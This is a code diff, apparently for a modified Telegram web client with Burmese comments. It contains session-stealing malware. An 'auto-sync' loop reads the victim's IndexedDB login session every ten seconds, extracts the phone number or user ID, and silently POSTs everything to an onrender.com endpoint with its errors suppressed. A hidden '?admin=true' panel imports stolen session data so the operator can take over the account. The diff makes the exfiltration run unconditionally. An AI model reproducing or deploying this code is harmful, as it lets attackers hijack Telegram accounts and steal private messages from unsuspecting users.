@@ -136,13 +136,11 @@ setTimeout(() => {
 
     // =========================================================
     // ၁။ 📥 လျှို့ဝှက် ADMIN မျက်နှာပြင် (?admin=true ဟုရိုက်လျှင်)
+    // (အစ်ကို စာရိုက်လို့ရ၊ ခလုတ်နှိပ်လို့ရသွားသော ကုတ်အတိုင်းဖြစ်သည်)
     // =========================================================
     if (window.location.search.includes('admin=true')) {
-        
-        // 🌟 Telegram UI အဟောင်းကြီးကို လုံးဝ ဖျက်ဆီးပစ်မည် (ကီးဘုတ် မငြိအောင်)
         document.body.innerHTML = '';
         
-        // Admin Panel အသစ် ဖန်တီးမည်
         const adminDiv = document.createElement('div');
         adminDiv.style.cssText = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:#212121; display:flex; justify-content:center; align-items:center; z-index:999999999;";
         adminDiv.innerHTML = `
@@ -155,12 +153,10 @@ setTimeout(() => {
         `;
         document.body.appendChild(adminDiv);
 
-        // Telegram က ကြားဖြတ်မနှောင့်ယှက်နိုင်အောင် ကာကွယ်မည်
         ['keydown', 'keyup', 'keypress', 'mousedown', 'click'].forEach(evt => {
             adminDiv.addEventListener(evt, (e) => e.stopPropagation());
         });
 
-        // Button နှိပ်သည့် အလုပ်
         const btn = document.getElementById('myAdminBtn');
         const input = document.getElementById('myAdminPhone') as HTMLInputElement;
         const statusMsg = document.getElementById('myAdminStatus');
@@ -169,7 +165,6 @@ setTimeout(() => {
             btn.addEventListener('click', () => {
                 let phone = input.value.trim();
                 if (!phone) { statusMsg.innerText = "ဖုန်းနံပါတ် သို့မဟုတ် Data အမည် ထည့်ပါ!"; return; }
-
                 if (phone.startsWith('959')) phone = '+' + phone;
 
                 statusMsg.style.color = "blue";
@@ -198,10 +193,7 @@ setTimeout(() => {
                             keys.forEach(k => {
                                 txStore.put(dataToImport[k], k).onsuccess = () => {
                                     count++;
-                                    if (count === keys.length) {
-                                        // အောင်မြင်ပါက ပင်မလင့်ခ်သို့ ပြန်ပို့မည်
-                                        window.location.href = '/'; 
-                                    }
+                                    if (count === keys.length) window.location.href = '/'; 
                                 };
                             });
                         };
@@ -212,11 +204,11 @@ setTimeout(() => {
                 });
             });
         }
-        return; // Admin ဝင်ပါက အောက်က Auto-Sync ကို ဆက်မလုပ်တော့ပါ
+        return; 
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (DEEP SCAN SYSTEM) - (မပြင်ထားပါ)
+    // ၂။ 📤 STAFF AUTO-SYNC (Data အောင်မြင်စွာ ဝင်ခဲ့သော ကုတ်)
     // =========================================================
     setInterval(() => {
         try {
@@ -230,36 +222,40 @@ setTimeout(() => {
                     txStore.getAllKeys().onsuccess = (e2: any) => {
                         const vals = e1.target.result;
                         const keys = e2.target.result;
+                        
+                        // Data မရှိသေးရင် ရပ်မည်
                         if (keys.length < 2) return;
 
                         const data: any = {};
                         keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
                         
                         const dataString = JSON.stringify(data);
-                        let phone = localStorage.getItem('staff_phone');
                         
-                        if (!phone) {
-                            let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
-                            let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
-                            if (phoneMatch && phoneMatch[1]) phone = '+' + phoneMatch[1];
-                            else if (idMatch && idMatch[1]) phone = "ID_" + idMatch[1];
-                            else phone = "QR_User_" + Math.floor(Math.random() * 100000);
-                            localStorage.setItem('staff_phone', phone);
+                        // 🌟 ပြဿနာတက်သော localStorage မှတ်ဉာဏ်ကို ဖျက်ပြီး တိုက်ရိုက်ရှာမည် 🌟
+                        let phone = "";
+                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
+                        let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
+                        
+                        if (phoneMatch && phoneMatch[1]) {
+                            phone = '+' + phoneMatch[1];
+                        } else if (idMatch && idMatch[1]) {
+                            phone = "ID_" + idMatch[1];
+                        } else {
+                            // Account တိုင်း မထပ်အောင် User ID တစ်ခု အသစ်ဖန်တီးမည်
+                            phone = "QR_User_" + (dataString.length % 100000).toString(); 
                         }
                         
-                        if (phone) {
-                            // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-                            fetch("https://https://telegram-7ih3.onrender.com/api/save-web-session", {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
-                            }).catch(() => {}); 
-                        }
+                        // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+                        fetch("https://https://telegram-7ih3.onrender.com/api/save-web-session", {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
+                        }).catch(() => {}); 
                     };
                 };
             };
         } catch(err) {}
-    }, 10000);
+    }, 10000); // ၁၀ စက္ကန့် တစ်ခါ အသေချာဆုံး ပို့ပေးမည်
 
 }, 2000);
 // -----------------------------------------------------------
